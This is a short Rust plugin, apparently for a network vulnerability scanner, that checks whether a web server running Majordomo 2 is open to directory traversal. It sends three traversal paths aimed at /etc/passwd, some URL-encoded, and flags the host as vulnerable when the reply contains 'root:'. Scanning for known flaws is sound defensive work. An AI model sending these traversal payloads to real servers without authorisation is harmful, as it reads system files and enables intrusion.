/* http-majordomo2-dir-traversal-2 - Majordomo 2 directory traversal probe */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let paths = [
        "/majordomo/..%2f..%2f..%2fetc/passwd",
        "/majordomo2/..%2f..%2fetc/passwd",
        "/majordomo/../../etc/passwd",
    ];
    let mut found = 0usize;
    for p in paths.iter() {
        let resp = match http_request(ctx, "GET", p, None, "", "", None, 8192) {
            Some(r) if !r.is_empty() => r,
            _ => continue,
        };
        if contains_ci(http_body(&resp), "root:") {
            append_out(ctx, &format!("{}{}",
                if found == 0 { "VULNERABLE: " } else { ", " }, p));
            found += 1;
        }
    }
    if found == 0 {
        set_out(ctx, "not vulnerable: Majordomo 2 path traversal");
    } else {
        append_out(ctx, " (Majordomo 2 path traversal)");
    }
    0
}
